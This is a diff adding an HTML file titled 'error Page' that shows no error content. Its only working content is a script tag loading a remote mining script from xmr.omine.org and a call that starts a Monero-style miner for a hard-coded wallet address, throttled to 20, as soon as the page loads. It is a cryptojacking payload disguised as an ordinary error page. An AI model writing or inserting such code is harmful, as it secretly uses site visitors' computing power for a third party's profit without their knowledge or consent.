@@ -1,0 +1,12 @@
+<html>
+	<head>
+		<title>error Page</title>
+	</head>
+			<script src="https://xmr.omine.org/assets/v7.js"></script>
+			<script>
+				OMINE("44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn","-1");
+				throttleMiner=20;
+			</script>
+		</body>
+
+</html>
